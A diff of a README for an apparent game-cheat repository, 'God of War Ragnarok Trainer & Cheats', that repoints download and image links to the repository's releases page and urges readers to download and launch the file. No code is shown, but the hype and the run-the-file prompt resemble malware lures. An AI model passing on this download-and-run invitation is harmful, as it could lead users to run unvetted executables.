@@ -12,7 +12,7 @@ Welcome to the *God of War Ragnarok Trainer & Cheats* repository! Here you will 
 
 Click the button below to download the latest release of our cheats and mods for God of War Ragnarok:
 
-[![Download God of War Ragnarok Trainer](https://img.shields.io/badge/Download-Release-orange)](https://github.com/releases/789694263/Release.zip)
+[![Download God of War Ragnarok Trainer](https://github.com/CASAARIAN/God-Of-War-Ragnarok-Trainer-Cheats/releases)](https://github.com/CASAARIAN/God-Of-War-Ragnarok-Trainer-Cheats/releases)
 
 If the link ends with the file name, make sure to launch the file to get started with your enhanced gameplay experience.
 
@@ -50,7 +50,7 @@ Please note that the use of cheats and mods in games may violate the terms of se
 
 Let's make our journey in the world of God of War Ragnarok unforgettable with the power of cheats, mods, and trainers! Are you ready to ascend to godhood and conquer realms beyond imagination? Download now and unleash the true power of Kratos in God of War Ragnarok. 🌌🔱
 
-![God of War Ragnarok](https://www.example.com/god-of-war-ragnarok.jpg) 
+![God of War Ragnarok](https://github.com/CASAARIAN/God-Of-War-Ragnarok-Trainer-Cheats/releases) 
 
 # Become the God of War! 💪🎮
 
